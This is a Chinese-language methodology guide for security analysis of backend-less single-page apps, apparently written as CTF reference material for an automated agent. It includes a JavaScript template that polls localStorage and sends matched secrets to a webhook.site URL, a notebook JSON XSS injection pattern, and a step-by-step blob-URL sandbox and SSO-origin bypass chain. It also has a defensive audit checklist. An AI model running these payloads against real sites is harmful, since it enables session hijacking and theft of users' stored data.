# SPA/前端框架安全分析方法论

> 前端框架（SvelteKit、React SPA 等）安全分析参考。聚焦无后端数据库、数据全部存在客户端的场景（localStorage/sessionStorage）。

---

## 1. 纯前端 SPA 架构识别

### 1.1 架构特征

| 特征 | 说明 | 识别方法 |
|------|------|---------|
| 无后端 API | 所有数据存在浏览器 localStorage/sessionStorage | 页面操作后刷新，检查 Network 面板是否有 API 请求 |
| 无 Cookie 认证 | 认证状态存在 localStorage | 检查 Application → Storage → localStorage 中是否有 session 相关 key |
| 框架路由 | URL 变化但不刷新页面 | 检查页面 HTML 中是否有框架特征（`__svelte`、`__next` 等） |
| 代码在浏览器执行 | 逻辑全部在客户端 JS 中 | 页面源码中几乎没有服务端渲染内容 |

### 1.2 数据存储方式

| 存储方式 | 安全特性 | 攻击面 |
|---------|---------|-------|
| **localStorage** | 同源可读写，持久化，JS 可访问 | XSS → `localStorage.getItem()` 读取所有数据 |
| **sessionStorage** | 同源可读写，标签页关闭即清除 | 同上，但数据生命周期更短 |
| **IndexedDB** | 同源可读写，支持复杂查询 | XSS → 读取数据库内容 |
| **Cookie** | 同源自动发送，可设 httpOnly | 未设 httpOnly 的 Cookie 可通过 `document.cookie` 读取 |

### 1.3 localStorage 中的敏感数据

**检查方法**：在浏览器 Console 中执行：
```javascript
// 查看所有 localStorage 数据
Object.entries(localStorage).forEach(([k, v]) => console.log(k, ':', v.substring(0, 100)))
```

**常见敏感数据**：
| key 模式 | 内容 | 安全影响 |
|---------|------|---------|
| `*.users.*` / `*.accounts.*` | 用户数据（JSON） | 可能包含密码、个人信息 |
| `*.session.*` / `*.token.*` | 认证 token | 会话劫持 |
| `*.config.*` / `*.settings.*` | 应用配置 | 可能包含 API 密钥 |
| `*.notebooks.*` / `*.data.*` | 用户数据 | 可能包含敏感内容 |

---

## 2. SvelteKit 分析方法论

### 2.1 路由结构

SvelteKit 使用基于文件系统的路由：

```
src/routes/
├── +page.svelte       → / （首页）
├── +layout.svelte     → 全局布局
├── auth/
│   └── +page.svelte   → /auth/ （认证页面）
├── new/
│   └── +page.svelte   → /new/ （新建页面）
└── ...
```

**关键文件**：
- `+page.svelte`：页面组件（HTML + JS + CSS）
- `+page.ts`：页面数据加载器（SSR 时执行）
- `+layout.svelte`：布局组件（子路由共用）
- `$lib/`：共享组件库

### 2.2 SvelteKit 安全关注点

| 关注点 | 检查方法 |
|--------|---------|
| 认证逻辑 | 搜索 `localStorage` 读写 session key |
| 数据导入 | 搜索 `url` 参数 + `fetch` / `import` |
| iframe 使用 | 搜索 `<iframe` 和 `sandbox` 属性 |
| 重定向逻辑 | 搜索 `window.location.assign`、`redirect` |
| postMessage | 搜索 `postMessage`、`addEventListener('message'` |
| SSO/OAuth | 搜索 `sso`、`callback`、`token`、`return` 参数 |

### 2.3 Notebook/导入类攻击面

当应用支持从 URL 导入内容时：

```svelte
<!-- 典型模式：URL 导入 notebook JSON -->
<NotebookApp allowUrlImport={true} />
```

**攻击链**：
1. 攻击者构造恶意 JSON 文件（包含 XSS payload 在 `text/html` 输出中）
2. 托管恶意 JSON 在外部服务器（如 webhook.site）
3. 让 Bot 访问 `/new/?url=<恶意 JSON 的 URL>`
4. 应用从 URL 下载 JSON 并渲染
5. JSON 中的 HTML 输出被放在 sandboxed iframe 中

---

## 3. Bot + localStorage 组合利用

### 3.1 与 Cookie 变体的关键区别

| 维度 | Cookie 变体 | localStorage 变体 |
|------|-----------|------------------|
| 数据读取方式 | `document.cookie` | `localStorage.getItem('key')` |
| 是否需要知道 key | 不需要（读全部） | **需要知道 key 名** |
| 数据写入时机 | Bot 启动时预设 | Bot 可能在**访问后**才写入 |
| httpOnly 保护 | 可能有 | 不适用（localStorage 没有 httpOnly 概念） |
| 跨域访问 | 同源限制 | 同源限制 |

### 3.2 异步 flag 写入时间差利用

**场景**：Bot 先访问攻击者 URL（firstPage），再在新页面（secondPage）中写入 flag。

```javascript
// Bot 时间线（Yipiter 案例）
t=0s    firstPage.goto(attackerUrl)      // 攻击者 XSS 开始执行
t=3s    firstPage.close()                // firstPage 关闭
        但 firstPage 打开的 popup 窗口仍然存活！
t=5s    secondPage 注册+登录
t=10s   secondPage 执行 print(FLAG) 并保存到 localStorage
        // localStorage 里现在有 flag 了
t=11s   secondPage.close()
t=11s   browser.close()                  // 所有窗口关闭
```

**利用条件**：
1. XSS 代码在一个**不会随 firstPage 关闭而销毁的窗口**中运行
2. XSS 代码能轮询 localStorage 等待 flag 出现
3. Bot 的浏览器在写入 flag 后不会立即关闭（有足够时间读取）

### 3.3 轮询等待模板

localStorage 轮询的核心逻辑（500ms 间隔，正则匹配 flag 模式，通过 Image src 外泄）：

```javascript
// 简化模板 — 适用于 popup 已在同源顶级页面中的场景
var tk = 0, iv = setInterval(function() {
  try {
    var users = localStorage.getItem('app.users.v1') || '';
    var m = users.match(/FLAG_PATTERN\{[^}]+\}/);
    if (m) {
      clearInterval(iv);
      new Image().src = 'https://webhook.site/xxx/?flag=' + encodeURIComponent(m[0]);
    }
  } catch(e) {}
  if (++tk > 200) clearInterval(iv);  // 超时停止（100 秒）
}, 500);
```

> 完整的攻击编排模板（含 iframe 逃逸、postMessage 通信、错误处理），见 `$AGENT_DIR/knowledge-base/attack-orchestration.md` §3.3。

### 3.4 popup 存活机制

**关键行为**：`firstPage.close()` 只关闭 firstPage 本身，firstPage 通过 `window.open()` 打开的 popup 窗口**不会关闭**。popup 会继续存活，直到 `browser.close()` 被调用。

**sandbox 对 popup 的影响**：如果 firstPage 在 sandboxed iframe 中，popup 也继承 sandbox 限制。需要通过 blob URL 逃逸才能获得完整 origin。

> 完整的 Bot 行为模式分析、利用条件、攻击编排模板，见 `$AGENT_DIR/knowledge-base/attack-orchestration.md` §3 "Bot 时间差利用"。

---

## 4. 前端应用导入功能审计

### 4.1 导入入口点

| 入口点 | 说明 | 风险 |
|--------|------|------|
| URL 参数导入 | `?url=<json_url>` 从外部 URL 下载内容 | SSRF + 内容注入 |
| 文件上传导入 | 用户上传 JSON/ZIP 文件 | 恶意内容注入 |
| 粘贴导入 | 用户粘贴内容 | 内容注入 |
| API 导入 | 通过 API 端点导入 | 内容注入 |

### 4.2 Notebook JSON 注入模式

```json
{
  "nbformat": 4,
  "cells": [{
    "cell_type": "code",
    "source": ["print('x')\n"],
    "outputs": [{
      "output_type": "display_data",
      "data": {
        "text/html": "<script>/* 恶意 JS */</script>"
      }
    }]
  }]
}
```

**关键**：`outputs` 字段是预计算的输出结果。应用通常会直接把 `text/html` 的内容放在 iframe 中渲染，不做消毒。

### 4.3 审计清单

- [ ] 导入的数据格式是否包含 HTML 输出字段？
- [ ] HTML 输出是否在 iframe 中渲染？sandbox 属性是什么？
- [ ] sandbox 是否包含 `allow-scripts`（允许 JS 执行）？
- [ ] sandbox 是否包含 `allow-same-origin`（允许访问 Cookie/localStorage）？
- [ ] sandbox 是否包含 `allow-popups`（允许打开新窗口）？
- [ ] 是否有 CSP 保护导入内容的渲染？
- [ ] 导入 URL 是否做了域名限制（SSRF）？

---

## 5. 实战案例

### 5.1 Yipiter 攻击链（CyberGame 2026）

```
架构：SvelteKit SPA + Pyodide notebook + Puppeteer Bot
Flag 位置：localStorage（Bot 在 secondPage 中写入）

攻击链：
  ① 控制器页面（外部 HTML）
  ② window.open(challenge/new/?url=notebook_json_url, 'seed')
  ③ 应用下载恶意 notebook，HTML 输出放在 sandboxed blob iframe
  ④ sandbox: allow-scripts allow-popups（无 allow-same-origin）
  ⑤ iframe 内 JS：location.href = blob URL → postMessage 给控制器
  ⑥ 控制器收到 blob URL → 构造 SSO 回调 URL
  ⑦ SSO 回调验证 blob URL origin === challenge origin → 通过
  ⑧ SSO 重定向到 blob URL → 作为顶级页面加载
  ⑨ 顶级页面无 sandbox → 可读 localStorage → 轮询等 flag
  ⑩ flag 写入后轮询检测到 → 外泄到 webhook

关键发现：
  - blob URL 继承创建者 origin，通过 SSO 回调的 origin 检查
  - sandbox 的限制只在 iframe 上下文中生效
  - popup 在 firstPage 关闭后存活，轮询可持续到 flag 写入
  - 应用完全无后端，所有安全逻辑在客户端 JS 中
```
